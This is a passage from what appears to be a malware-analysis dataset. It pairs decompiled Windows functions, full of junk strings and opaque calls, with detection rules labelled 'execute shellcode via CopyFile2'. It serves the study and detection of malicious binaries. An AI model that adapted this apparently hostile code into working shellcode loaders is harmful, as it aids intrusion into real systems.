\"licrgkqdnuqfxtcuqbxoqteamhoapaesxwnviwurwxgojagbnicdpycsdq\";\n    *(puVar2 + -0x48) = 0x3a;\n    *(puVar2 + -0x4c) = 0x413938;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    *piStack40 = &stack0xffffff70;\n    piVar3[1] = *0x4ea440;\n    piVar3[2] = *0x4ea444;\n    piVar3[3] = *0x4ea448;\n    piVar3[4] = *0x4ea44c;\n    *(piVar3 + 5) = 0;\n    piVar3[0xc] = 0x1087;\n    *(piVar3 + 0xd) = 0;\n    piVar3[0xe] = 0x9da;\n    *(puVar2 + -0x4c) = 0x413969;\n    fcn.0040168b();\n    puVar2 = puStack44;\n    uVar6 = uStack124;\n    if (0xf < uStack124) {\n        uVar6 = uStack124 + 1;\n        uVar7 = uStack144;\n        if (0xfff < uVar6) {\n            uVar7 = *(uStack144 - 4);\n            puVar12 = puStack44;\n            if (0x1f < (uStack144 - 4) - uVar7) goto code_r0x00413fd6;\n            uVar6 = uStack124 + 0x24;\n        }\n        *(puStack44 + -4) = uVar6;\n        *(puVar2 + -8) = uVar7;\n        *(puVar2 + -0xc) = 0x4139a4;\n        uVar6 = fcn.00401a32(*(puVar2 + -8));\n    }\n    uStack128 = 0;\n    uStack124 = 0xf;\n    uStack144 = uStack144 & 0xffffff00;\n    puStack44 = puVar2;\n    *(puVar2 + -4) = uVar6;\n    piStack40 = puVar2 + -0x24;\n    *(puVar2 + -0x1c) = 0;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -8) = 0xf;\n    puVar2[-0x1c] = 0;\n    puVar12 = puVar2 + -0x30;\n    puVar2[-0x2c] = uStack36;\n    *(puVar2 + -0x28) = \"vipemqbjhgxcxnsbkpxyqwtmhvzejx\";\n    *(puVar2 + -0x30) = 0x1e;\n    *(puVar2 + -0x34) = 0x413a02;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    piStack40[1] = 0x40703000;\n    *piVar3 = 0;\n    piVar3[8] = 0x29f;\n    uVar6 = piVar3[7];\n    if (0xf < uVar6) {\n        iVar8 = piVar3[2];\n        uVar7 = uVar6 + 1;\n        iVar9 = iVar8;\n        if (0xfff < uVar7) {\n            iVar9 = *(iVar8 + -4);\n            if (0x1f < (iVar8 + -4) - iVar9) goto code_r0x00413fe2;\n            uVar7 = uVar6 + 0x24;\n        }\n        *(puVar2 + -0x34) = uVar7;\n        *(puVar2 + -0x38) = iVar9;\n        *(puVar2 + -0x3c) = 0x413a4e;\n        uVar6 = fcn.00401a32(*(puVar2 + -0x38));\n    }\n    puVar2 = puStack44;\n    *(puStack44 + -4) = uVar6;\n    piStack40 = puVar2 + -0x48;\n    *(puVar2 + -0x30) = 0;\n    *(puVar2 + -0x20) = 0;\n    *(puVar2 + -0x1c) = 0xf;\n    puVar2[-0x30] = 0;\n    puVar2[-0x50] = uStack36;\n    *(puVar2 + -0x4c) = \"guytxlqghybsljthahiytutejtuqktoxifnsprtcyavieyhlmwyobczbfff\";\n    *(puVar2 + -0x54) = 0x3b;\n    *(puVar2 + -0x58) = 0x413a97;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    piStack40[1] = 0x40478000;\n    *puVar4 = 0;\n    puVar4[2] = *0x4ea460;\n    puVar4[3] = *0x4ea464;\n    puVar4[4] = *0x4ea468;\n    puVar4[5] = *0x4ea46c;\n    puVar4[0xd] = 0x40d042c0;\n    puVar4[0xc] = 0;\n    puVar4[0xe] = 0x7ef;\n    *(puVar4 + 0xf) = 1;\n    puVar4[0x11] = 0x40d41d00;\n    puVar4[0x10] = 0;\n    *(puVar2 + -0x58) = 0x413ade;\n    uVar5 = fcn.00404836();\n    puVar2 = puStack44;\n    puVar10 = puStack44 + -4;\n    *(puStack44 + -4) = uVar5;\n    piStack40 = puVar2 + -0x78;\n    puStack56 = puVar2 + -0x18;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -8) = 0;\n    *puVar10 = 0xf;\n    puVar2[-0x18] = 0;\n    puVar2[-0x80] = uStack36;\n    *(puVar2 + -0x7c) = \"zzlwfeyxjppewzvfbeeluosryoboqywoanupzawhcpatngkuzaachydjrvpfllaflsw\";\n    *(puVar2 + -0x84) = 0x43;\n    *(puVar2 + -0x88) = 0x413b27;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    piStack52 = piStack40 + 0x10;\n    piStack40[0x10] = 0;\n    piVar3[0x14] = 0;\n    piVar3[0x15] = 0xf;\n    *(piVar3 + 0x10) = 0;\n    uStack20 = 9;\n    puVar2[-0x8c] = uStack36;\n    *(puVar2 + -0x88) = \"lyoarbjcptdoiuukjenzqbcwsrfagbarhdrkqxyuulcqghmopqmgkgxfxehdtwpim\";\n    *(puVar2 + -0x90) = 0x41;\n    *(puVar2 + -0x94) = 0x413b6e;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    piStack48 = piStack40 + 10;\n    piStack40[10] = 0;\n    piVar3[0xe] = 0;\n    piVar3[0xf] = 0xf;\n    *(piVar3 + 10) = 0;\n    uStack20 = 10;\n    puVar2[-0x98] = uStack36;\n    *(puVar2 + -0x94) = \"agpltsvaaufaxnfavqpmsdcnherogtffpyajivlywmjxvexrlhvtozrumlprafsvc\";\n    *(puVar2 + -0x9c) = 0x41;\n    *(puVar2 + -0xa0) = 0x413bb5;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    piStack40[2] = 0;\n    piVar3[6] = 0;\n    piVar3[7] = 0xf;\n    *(piVar3 + 2) = 0;\n    uStack20 = 0xb;\n    puVar2[-0xa4] = uStack36;\n    *(puVar2 + -0xa0) = \"uxmzkuiptwqbvuooakzvstdrxomyeeengcsquvsdbbomnygeaikwqslkqnzrruhuaazmhaalazfpwh\";\n    *(puVar2 + -0xa8) = 0x4e;\n    *(puVar2 + -0xac) = 0x413bfb;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    *piStack40 = &stack0xffffff88;\n    piVar3[1] = 0x68c;\n    piVar3[9] = 0x4091f000;\n    piVar3[8] = 0;\n    piVar3[0x17] = 0x40d14680;\n    piVar3[0x16] = 0;\n    uStack20 = 8;\n    *(puVar2 + -0xac) = 0x413c32;\n    fcn.00404124();\n    puVar2 = puStack44;\n    if (0xf < uStack100) {\n        uVar6 = uStack100 + 1;\n        uVar7 = uStack120;\n        if (0xfff < uVar6) {\n            uVar7 = *(uStack120 - 4);\n            puVar12 = puStack44;\n            if (0x1f < (uStack120 - 4) - uVar7) goto code_r0x00413fee;\n            uVar6 = uStack100 + 0x24;\n        }\n        *(puStack44 + -4) = uVar6;\n        *(puVar2 + -8) = uVar7;\n        *(puVar2 + -0xc) = 0x413c6a;\n        fcn.00401a32(*(puVar2 + -8));\n    }\n    uStack104 = 0;\n    uStack100 = 0xf;\n    uStack120 = uStack120 & 0xffffff00;\n    puVar12 = puVar2 + -0x2c;\n    *(puVar2 + -0x2c) = &stack0xffffffa0;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x1c) = 0;\n    *(puVar2 + -0x28) = 0;\n    *(puVar2 + -0x30) = 0x413ca5;\n    fcn.0040543e();\n    uVar6 = uStack76;\n    if (0xf < uStack76) {\n        uVar6 = uStack76 + 1;\n        uVar7 = uStack96;\n        if (0xfff < uVar6) {\n            uVar7 = *(uStack96 - 4);\n            if (0x1f < (uStack96 - 4) - uVar7) goto code_r0x00413ffa;\n            uVar6 = uStack76 + 0x24;\n        }\n        *(puVar2 + -0x30) = uVar6;\n        *(puVar2 + -0x34) = uVar7;\n        *(puVar2 + -0x38) = 0x413cda;\n        uVar6 = fcn.00401a32(*(puVar2 + -0x34));\n    }\n    uStack80 = 0;\n    uStack76 = 0xf;\n    uStack96 = uStack96 & 0xffffff00;\n    puStack44 = puVar2 + -0x2c;\n    *(puVar2 + -0x30) = uVar6;\n    piStack40 = puVar2 + -0x7c;\n    *(puVar2 + -0x48) = 0;\n    *(puVar2 + -0x38) = 0;\n    *(puVar2 + -0x34) = 0xf;\n    puVar2[-0x48] = 0;\n    puVar2[-0x84] = uStack36;\n    *(puVar2 + -0x80) = \"jlqmdcrmqbtjyvrzlloptos\";\n    *(puVar2 + -0x88) = 0x17;\n    *(puVar2 + -0x8c) = 0x413d35;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    piStack40[5] = *0x4ea480;\n    puVar4[6] = *0x4ea484;\n    puVar4[7] = *0x4ea488;\n    puVar4[8] = *0x4ea48c;\n    puVar4[4] = 0xf;\n    *puVar4 = 0x766b7175;\n    puVar4[1] = 0x62696568;\n    puVar4[2] = 0x7475686a;\n    *(puVar4 + 0xb) = 0x63787874;\n    *(puVar4 + 0xf) = 0;\n    puVar4[9] = 0x1ecd;\n    *(puVar4 + 10) = 0;\n    *(puVar4 + 0xb) = 0;\n    *(puVar4 + 0xc) = 0;\n    puVar4[0x13] = 0x14d1;\n    *(puVar2 + -0x8c) = 0x413d88;\n    fcn.00404f1b();\n    puVar2 = puStack44;\n    puVar11 = puStack44 + -4;\n    *(puStack44 + -4) = 0;\n    *(puVar2 + -8) = 0x413d92;\n    fcn.00403715();\n    *(puVar2 + -8) = 0x413d97;\n    fcn.00404377();\n    piStack40 = puVar2 + -0x40;\n    puStack44 = puVar11;\n    *(puVar2 + -0x28) = 0;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -0x14) = 0xf;\n    puVar2[-0x28] = 0;\n    puVar12 = puVar2 + -0x4c;\n    puVar2[-0x48] = uStack36;\n    *(puVar2 + -0x44) = \"sgdjubsynijiqppikspfsnpszxcftbyeqwxghdgkrclaksggpnpwxxguqkhemlalhfyqnfrwvqypocajcerwwdnxkh\";\n    *(puVar2 + -0x4c) = 0x5a;\n    *(puVar2 + -0x50) = 0x413ddc;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    *piStack40 = *0x4ea4a0;\n    piVar3[1] = *0x4ea4a4;\n    piVar3[2] = *0x4ea4a8;\n    piVar3[3] = *0x4ea4ac;\n    piVar3[4] = 0x40b5e900;\n    *(piVar3 + 5) = 1;\n    piVar3[0xd] = 0x40cc0d00;\n    piVar3[0xc] = 0;\n    *(piVar3 + 0xe) = 1;\n    uVar6 = piVar3[0xb];\n    if (0xf < uVar6) {\n        iVar8 = piVar3[6];\n        uVar7 = uVar6 + 1;\n        iVar9 = iVar8;\n        if (0xfff < uVar7) {\n            iVar9 = *(iVar8 + -4);\n            if (0x1f < (iVar8 + -4) - iVar9) goto code_r0x00414006;\n            uVar7 = uVar6 + 0x24;\n        }\n        *(puVar2 + -0x50) = uVar7;\n        *(puVar2 + -0x54) = iVar9;\n        *(puVar2 + -0x58) = 0x413e3b;\n        uVar6 = fcn.00401a32(*(puVar2 + -0x54));\n    }\n    puVar2 = puStack44;\n    *(puStack44 + -4) = uVar6;\n    piStack40 = puVar2 + -0x38;\n    *(puVar2 + -0x1c) = 0;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -8) = 0xf;\n    puVar2[-0x1c] = 0;\n    puVar2[-0x40] = uStack36;\n    *(puVar2 + -0x3c) = \"jjwateeqxwwceulmfndigfdfxyglugpmahdjeoirtralkucbjdvzfmnjismvfyduedxzdrjembzxsyzlpwdacovcrkhhev\"\n    ;\n    *(puVar2 + -0x44) = 0x5e;\n    *(puVar2 + -0x48) = 0x413e84;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    *piStack40 = 0x162;\n    *(puVar4 + 1) = 1;\n    puVar4[2] = 0x12f;\n    puVar4[4] = 0x40976800;\n    puVar4[3] = 0;\n    *(puVar4 + 5) = 0;\n    *(puVar4 + 6) = 0;\n    puVar4[0xd] = 0x3f4;\n    *(puVar2 + -0x48) = 0x413eba;\n    uVar5 = fcn.00406320();\n    puVar2 = puStack44;\n    *(puStack44 + -4) = uVar5;\n    piStack40 = puVar2 + -0x34;\n    *(puVar2 + -0x28) = 0;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -0x14) = 0xf;\n    puVar2[-0x28] = 0;\n    puVar12 = puVar2 + -0x40;\n    puVar2[-0x3c] = uStack36;\n    *(puVar2 + -0x38) = \"dkrywkfeazgaxwyzejzlvxxdngvxycjmxxgpkrezrxoaiynolndagkwbdxieltdjekbe\";\n    *(puVar2 + -0x40) = 0x44;\n    *(puVar2 + -0x44) = 0x413f02;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    *piStack40 = 1;\n    piVar3[2] = 0x40d5c040;\n    piVar3[1] = 0;\n    piVar3[9] = *0x4ea4c0;\n    piVar3[10] = *0x4ea4c4;\n    piVar3[0xb] = *0x4ea4c8;\n    piVar3[0xc] = *0x4ea4cc;\n    uVar6 = piVar3[8];\n    if (0xf < uVar6) {\n        iVar8 = piVar3[3];\n        uVar7 = uVar6 + 1;\n        iVar9 = iVar8;\n        if (0xfff < uVar7) {\n            iVar9 = *(iVar8 + -4);\n            if (0x1f < (iVar8 + -4) - iVar9) goto code_r0x00414012;\n            uVar7 = uVar6 + 0x24;\n        }\n        *(puVar2 + -0x44) = uVar7;\n        *(puVar2 + -0x48) = iVar9;\n        *(puVar2 + -0x4c) = 0x413f56;\n        fcn.00401a32(*(puVar2 + -0x48));\n    }\n    puVar2 = puStack44;\n    *(puStack44 + -0x14) = 0;\n    *(puVar2 + -0x18) = 0x413f66;\n    fcn.0040426e();\n    *(puVar2 + -0x20) = 0;\n    *(puVar2 + -0x2c) = 0;\n    *(puVar2 + -0x30) = 0x413f7d;\n    fcn.00401c6c();\n    *(puVar2 + -0x40) = 0;\n    *(puVar2 + -0x44) = 0;\n    *(puVar2 + -0x50) = 0;\n    *(puVar2 + -0x60) = 0x413f9f;\n    fcn.00404ad9();\n    *(puVar2 + -0x60) = 0;\n    *(puVar2 + -100) = 0;\n    *(puVar2 + -0x68) = 0x413faa;\n    fcn.00402f36();\n    *in_FS_OFFSET = iStack28;\n    return iStack72;\n}\n",
        "token_count": 8173
    },
    "0041f210": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint * __fastcall fcn.0041f210(uint *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t *piVar8;\n    uint uVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    int32_t iVar12;\n    int32_t *in_FS_OFFSET;\n    uint auStack148 [15];\n    uint uStack88;\n    uint uStack72;\n    uint uStack68;\n    uint *puStack64;\n    uint *puStack60;\n    uint *puStack56;\n    uint *puStack52;\n    uchar *puStack48;\n    uchar *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack44 = &stack0xffffffc0;\n    puStack32 = &stack0xffffffc0;\n    uStack24 = 0x44c010;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *param_1 = 0;\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    *param_1 = 0;\n    puStack64 = param_1 + 8;\n    param_1[8] = 0;\n    param_1[0xc] = 0;\n    param_1[0xd] = 0xf;\n    *(param_1 + 8) = 0;\n    piStack40 = &stack0xffffff6c;\n    puStack48 = &stack0xffffffa8;\n    uStack72 = 0;\n    uStack68 = 0xf;\n    uStack88 = 0;\n    uStack20 = 1;\n    puStack52 = param_1;\n    fcn.00402f72(0x49);\n    puVar11 = piStack40;\n    piStack40[4] = 0;\n    puVar11[8] = 0;\n    puVar11[9] = 0xf;\n    *(puVar11 + 4) = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x2d, uStack36, \"jpilfxazinrrwmourxhqscgcevckqwhqzpawzexhigjug\");\n    puVar11 = piStack40;\n    piStack40[1] = 0x40daa980;\n    *puVar11 = 0;\n    *(puVar11 + 2) = 1;\n    *(puVar11 + 3) = 0;\n    *(puVar11 + 10) = 1;\n    *(puVar11 + 0xb) = 1;\n    *(puVar11 + 0xc) = 0;\n    *(puVar11 + 0xd) = 1;\n    puVar11[0xe] = 0x514;\n    uStack20 = 1;\n    uVar9 = fcn.00403c38();\n    puVar6 = puStack44;\n    *(puStack44 + -4) = uVar9;\n    piStack40 = puVar6 + -0x2c;\n    *(puVar6 + -0x28) = 0;\n    *(puVar6 + -0x18) = 0;\n    *(puVar6 + -0x14) = 0xf;\n    puVar6[-0x28] = 0;\n    puVar6[-0x34] = uStack36;\n    *(puVar6 + -0x30) = \"havwmspmwmkfawtshgfkfjpuvohseqgxeejahamldohpsfxmxfgnybidhf\";\n    *(puVar6 + -0x38) = 0x3a;\n    *(puVar6 + -0x3c) = 0x41f38c;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    *piStack40 = 0;\n    uVar4 = *0x541f2c;\n    uVar3 = *0x541f28;\n    uVar9 = *0x541f24;\n    *(puVar7 + 0x1c) = *0x541f20;\n    *(puVar7 + 0x20) = uVar9;\n    *(puVar7 + 0x24) = uVar3;\n    *(puVar7 + 0x28) = uVar4;\n    *(puVar6 + -0x3c) = 0x41f3a2;\n    uVar9 = fcn.00402842();\n    puVar6 = puStack44;\n    *(puStack44 + -4) = uVar9;\n    piStack40 = puVar6 + -0x20;\n    *(puVar6 + -0x1c) = 0;\n    *(puVar6 + -0xc) = 0;\n    *(puVar6 + -8) = 0xf;\n    puVar6[-0x1c] = 0;\n    puVar6[-0x28] = uStack36;\n    *(puVar6 + -0x24) = \"mrabzbkcbmecqulmdycamvpnpnanvskcdiuqjehjglpcaqgpoebopwtcqqqkhwogqezrcwklcyxmhnxktgghokvplnaglb\"\n    ;\n    *(puVar6 + -0x2c) = 0x5e;\n    *(puVar6 + -0x30) = 0x41f3ea;\n    fcn.00402f72();\n    puVar7 = piStack40;\n    *piStack40 = 1;\n    *(puVar7 + 0x1c) = 0x249;\n    *(puVar6 + -0x30) = 0x41f3fc;\n    uVar9 = fcn.00404cc3();\n    puVar6 = puStack44;\n    *(puStack44 + -4) = uVar9;\n    piStack40 = puVar6 + -0x80;\n    puStack48 = puVar6 + -0x28;\n    *(puVar6 + -0x28) = 0;\n    *(puVar6 + -0x18) = 0;\n    *(puVar6 + -0x14) = 0xf;\n    puVar6[-0x28] = 0;\n    puVar6[-0x88] = uStack36;\n    *(puVar6 + -0x84) = \"igcmbpkpfuqfcclccebkrjntn\";\n    *(puVar6 + -0x8c) = 0x19;\n    *(puVar6 + -0x90) = 0x41f447;\n    fcn.00402f72();\n    puVar11 = piStack40;\n    puStack60 = piStack40 + 0x10;\n    piStack40[0x10] = 0;\n    puVar11[0x14] = 0;\n    puVar11[0x15] = 0xf;\n    *(puVar11 + 0x10) = 0;\n    uStack20 = 2;\n    puVar6[-0x94] = uStack36;\n    *(puVar6 + -0x90) = \"huntwsqwnhkmqknzwfgfnhaaeatrtkdvqvxbuqrdtjugbotyxybzvbjhs\";\n    *(puVar6 + -0x98) = 0x39;\n    *(puVar6 + -0x9c) = 0x41f48e;\n    fcn.00402f72();\n    puVar11 = piStack40;\n    puStack56 = piStack40 + 9;\n    piStack40[9] = 0;\n    puVar11[0xd] = 0;\n    puVar11[0xe] = 0xf;\n    *(puVar11 + 9) = 0;\n    uStack20 = 3;\n    puVar6[-0xa0] = uStack36;\n    *(puVar6 + -0x9c) = \"iswkygsjpqwxkuoxhsolrzzsfaikxszeehkrzggtxistjoxgdygmwdnfeyuikzdy\";\n    *(puVar6 + -0xa4) = 0x40;\n    *(puVar6 + -0xa8) = 0x41f4d5;\n    fcn.00402f72();\n    puVar11 = piStack40;\n    piStack40[2] = 0;\n    puVar11[6] = 0;\n    puVar11[7] = 0xf;\n    *(puVar11 + 2) = 0;\n    uStack20 = 4;\n    puVar6[-0xac] = uStack36;\n    *(puVar6 + -0xa8) = \"qmaxfourxunidemfmycldqnmqjld\";\n    *(puVar6 + -0xb0) = 0x1c;\n    *(puVar6 + -0xb4) = 0x41f51b;\n    fcn.00402f72();\n    puVar11 = piStack40;\n    piStack40[1] = 0x40be0a00;\n    *puVar11 = 0;\n    *(puVar11 + 8) = 0;\n    *(puVar11 + 0xf) = 0;\n    puVar11[0x1c] = 0x1870;\n    puVar11[0x1e] = 0x40cd9800;\n    puVar11[0x1d] = 0;\n    *(puVar11 + 0x1f) = 1;\n    uStack20 = 1;\n    *(puVar6 + -0xb4) = 0x41f558;\n    uVar9 = fcn.00404ac0();\n    puVar6 = puStack44;\n    *(puStack44 + -4) = uVar9;\n    piStack40 = puVar6 + -0x3c;\n    *(puVar6 + -0x3c) = 0;\n    *(puVar6 + -0x2c) = 0;\n    *(puVar6 + -0x28) = 0xf;\n    puVar6[-0x3c] = 0;\n    puVar6[-0x44] = uStack36;\n    *(puVar6 + -0x40) = \"wuqlghfofrutzduzxbravfgsjczggjkfddmppxiziddjlofmfzedjarewsbvwmxyoqrawngybqtdypj\";\n    *(puVar6 + -0x48) = 0x4f;\n    *(puVar6 + -0x4c) = 0x41f599;\n    fcn.00402f72();\n    piVar8 = piStack40;\n    *(piStack40 + 6) = 0;\n    piVar8[7] = 0x17a6;\n    piVar8[8] = 0xa8f;\n    iVar5 = *0x541f4c;\n    iVar12 = *0x541f48;\n    iVar2 = *0x541f44;\n    piVar8[9] = *0x541f40;\n    piVar8[10] = iVar2;\n    piVar8[0xb] = iVar12;\n    piVar8[0xc] = iVar5;\n    piVar8[0xd] = 0x435;\n    piVar8[0xe] = 0xaca;\n    uVar1 = piVar8[5];\n    if (0xf < uVar1) {\n        iVar2 = *piVar8;\n        uVar10 = uVar1 + 1;\n        iVar12 = iVar2;\n        if (0xfff < uVar10) {\n            iVar12 = *(iVar2 + -4);\n            if (0x1f < (iVar2 + -4) - iVar12) {\n                uStack20 = 0;\n                *(puVar6 + -0x4c) = 0x41f681;\n                fcn.004047f5();\n                *(puVar6 + -0x4c) = &stack0xfffffffc;\n                *(puVar6 + -0xd0) = 0x41f69f;\n                fcn.004052d1();\n                *(puVar6 + -0xd0) = &stack0x00000008;\n                *(puVar6 + -0x154) = 0x41f6b2;\n                puVar11 = fcn.00403a76();\n                return puVar11;\n            }\n            uVar10 = uVar1 + 0x24;\n        }\n        *(puVar6 + -0x4c) = uVar10;\n        *(puVar6 + -0x50) = iVar12;\n        *(puVar6 + -0x54) = 0x41f5fb;\n        fcn.00401a32(*(puVar6 + -0x50));\n    }\n    puVar6 = puStack44;\n    *(puStack44 + -0x14) = 0x41f609;\n    uVar9 = fcn.00405d12();\n    *(puVar6 + -0x14) = uVar9;\n    piStack40 = puVar6 + -0x30;\n    *(puVar6 + -0x28) = 0;\n    *(puVar6 + -0x18) = 0;\n    *(puVar6 + -0x14) = 0xf;\n    puVar6[-0x28] = 0;\n    puVar6[-0x38] = uStack36;\n    *(puVar6 + -0x34) = \"qzbiskxcpyscatvrzbigribpzvilebpygxom\";\n    *(puVar6 + -0x3c) = 0x24;\n    *(puVar6 + -0x40) = 0x41f64c;\n    fcn.00402f72();\n    puVar11 = piStack40;\n    piStack40[1] = 0x40c38b00;\n    *puVar11 = 0;\n    *(puVar6 + -0x40) = 0x41f661;\n    fcn.00401a2d();\n    *in_FS_OFFSET = iStack28;\n    return puStack52;\n}\n",
        "token_count": 3306
    },
    "00420be0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00420d5d)\n// WARNING: Removing unreachable block (ram,0x00420c91)\n// WARNING: Removing unreachable block (ram,0x00420c9f)\n// WARNING: Removing unreachable block (ram,0x00420cb0)\n// WARNING: Removing unreachable block (ram,0x00420cb7)\n// WARNING: Removing unreachable block (ram,0x004214fa)\n// WARNING: Removing unreachable block (ram,0x00420d6b)\n// WARNING: Removing unreachable block (ram,0x00420d7c)\n// WARNING: Removing unreachable block (ram,0x00420d83)\n// WARNING: Removing unreachable block (ram,0x00420ccb)\n// WARNING: Removing unreachable block (ram,0x00420cd9)\n// WARNING: Removing unreachable block (ram,0x00420cea)\n// WARNING: Removing unreachable block (ram,0x00420cf1)\n// WARNING: Removing unreachable block (ram,0x00421506)\n\nuint fcn.00420be0(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    int32_t *piVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    int32_t *piVar14;\n    int32_t *in_FS_OFFSET;\n    uint auStack236 [6];\n    uint uStack212;\n    uchar *puStack196;\n    char *pcStack192;\n    char *pcStack188;\n    uint32_t uStack184;\n    uint uStack180;\n    uint uStack172;\n    uint uStack168;\n    int32_t aiStack156 [5];\n    uint32_t uStack136;\n    uint32_t uStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    uint32_t uStack108;\n    uchar uStack104;\n    uint uStack92;\n    uint32_t uStack88;\n    uint uStack84;\n    uint *puStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    ushort uStack60;\n    uchar uStack58;\n    uint uStack56;\n    uint uStack52;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    int32_t *piStack40;\n    uint8_t uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffff64;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c0f0;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uStack180 = 0;\n    puStack196 = puStack196 & 0xffffff00 | uStack36;\n    pcStack192 = \"jpblzelaktxdzzidpjjzsmiwycohswwzdrrregzsyhnnyomktpzszvqpedapjvfejhonbgdswhpnyscgjjtenpkarouctyuvt\";\n    fcn.00402f72();\n    uStack184 = uStack184 & 0xffffff00;\n    uStack58 = 0;\n    uStack60 = 0x7867;\n    uStack64 = 0x68676b7a;\n    uStack68 = 0x6668706e;\n    piStack40 = &stack0xffffff64;\n    uStack56 = 0;\n    uStack52 = 0xf;\n    uStack72 = 0x6d666900;\n    uStack180 = 0;\n    pcStack192 = pcStack192 & 0xffffff00 | uStack36;\n    pcStack188 = \"bcftadalbpwdaviwxrrcnfoknwewrudcxagrrtbcwfrexvwtcgntianamnaikeqwzncehlhhvwbrcjbzoxs\";\n    puStack196 = 0x53;\n    fcn.00402f72();\n    uStack184 = 0x1cb;\n    piStack48 = &stack0xffffff14;\n    piStack44 = &stack0xffffff44;\n    uStack172 = 0;\n    uStack168 = 0xf;\n    pcStack188 = NULL;\n    fcn.00402f72(0x55, uStack36, \"hvzuexqzgahhmnydsytivmratvrwepqmszyntkubjmpfycdvhoasyrqvmbytvmqbdwxxmnyqavailekwslktz\"\n                );\n    puStack196 = NULL;\n    pcStack192 = 0xf;\n    uStack212 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x50, uStack36, \"aoqutshtxhpsvxqyongsbuwtyjsvgmhyxeazazkspbglhupndbfbodsbkhbtxevxblqsvjaowiektscu\");\n    puVar4 = piStack48;\n    *piStack48 = 0x7e1;\n    *(puVar4 + 1) = 1;\n    *(puVar4 + 2) = 0;\n    *(puVar4 + 3) = 1;\n    puVar4[5] = 0x40e77000;\n    puVar4[4] = 0;\n    puVar4[0x12] = 0x1e4;\n    puVar4[0x13] = 0x13ff;\n    uStack20 = 0xffffffff;\n    uVar7 = fcn.00402513();\n    piVar6 = piStack40;\n    piVar12 = piStack40 + -1;\n    piStack40[-1] = uVar7;\n    piStack44 = piVar6 + -6;\n    piVar6[-6] = 0;\n    piVar6[-2] = 0;\n    *piVar12 = 0xf;\n    *(piVar6 + -6) = 0;\n    *(piVar6 + -0x17) = uStack36;\n    piVar6[-0x16] = \"ldgxpehljqsscgpbdoaujobjqzoliihjeeqwsfxmjqwituzktprazncajiwmpxoekjfypvlveuwbvbcsbegxvwu\";\n    piVar6[-0x18] = 0x57;\n    piVar6[-0x19] = 0x420e9f;\n    fcn.00402f72();\n    piVar6[-0x12] = 0;\n    piVar6[-0xe] = 0;\n    piVar6[-0xd] = 0xf;\n    piStack48 = piVar6 + -0x15;\n    *(piVar6 + -0x12) = 0;\n    uStack20 = 8;\n    *(piVar6 + -0x1a) = uStack36;\n    piVar6[-0x19] = \"fznjbgccqvgmxomxswiejcpqcwzuaoouezahwcysvfyoevhsqtbjjrxduzketfpkrdnbhhowdnjxnyejtjxwuznvisvfszj\";\n    piVar6[-0x1b] = 0x5f;\n    piVar6[-0x1c] = 0x420ee3;\n    fcn.00402f72();\n    puVar5 = piStack48;\n    *piStack48 = 0;\n    *(puVar5 + 4) = 0x5f9;\n    puVar5[8] = 1;\n    *(puVar5 + 0x28) = 0x40e555c0;\n    *(puVar5 + 0x24) = 0;\n    uVar2 = *0x541f6c;\n    uVar1 = *0x541f68;\n    uVar7 = *0x541f64;\n    *(puVar5 + 0x2c) = *0x541f60;\n    *(puVar5 + 0x30) = uVar7;\n    *(puVar5 + 0x34) = uVar1;\n    *(puVar5 + 0x38) = uVar2;\n    piVar6[-0x1c] = 0x420f12;\n    uVar7 = fcn.00402a18();\n    piVar6 = piStack40;\n    piVar13 = piStack40 + -1;\n    piStack40[-1] = uVar7;\n    piVar6[-10] = 0;\n    piVar6[-6] = 0;\n    piVar6[-5] = 0xf;\n    *(piVar6 + -10) = 0;\n    uStack20 = 0xffffffff;\n    *(piVar6 + -0xc) = uStack36;\n    piVar6[-0xb] = \"kykcynyjmcbpvtxfuqazbywq\";\n    piVar6[-0xd] = 0x18;\n    